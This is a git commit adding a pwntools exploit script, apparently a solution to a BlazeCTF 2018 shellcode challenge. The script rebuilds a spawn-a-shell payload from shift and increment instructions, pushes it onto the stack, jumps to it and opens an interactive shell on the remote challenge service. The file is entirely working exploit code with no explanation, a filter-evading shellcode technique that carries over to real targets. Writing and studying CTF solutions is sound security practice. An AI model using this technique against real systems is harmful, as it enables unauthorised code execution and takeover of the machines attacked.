755c462783c14d4e771bef2445053978e08727a3
minetosh <minetosh@gmail.com>
2018-06-13 15:36:40 +0900

    Add files via upload

---
+++ 2018/BlazeCTF/shellcodeme_hard.py
@@ -0,0 +1,29 @@
+from pwn import *
+
+context(os='linux', arch='amd64')
+
+def makesh(val):
+    base = 2 ** 63
+    code = ''
+    for i in range(64):
+        code += 'shl rax, 1\n'
+        if (val / base > 0):
+            code += 'inc rax\n'
+            val -= base
+        base /= 2
+    return code
+
+shcode = asm(shellcraft.sh())
+stack = ''
+for i in range((len(shcode) + 7) / 8):
+    sub8 = shcode[i * 8:(i + 1) * 8]
+    for j in range(len(sub8), 8):
+        sub8 += '\x00'
+    stack = makesh(u64(sub8)) + 'push rax\n' + stack
+
+stack += 'jmp rsp\n'
+
+# r = process('./shellcodeme_hard')
+r = remote('shellcodeme.420blaze.in', 4200)
+r.sendlineafter('Shellcode?\n', asm(stack))
+r.interactive() 
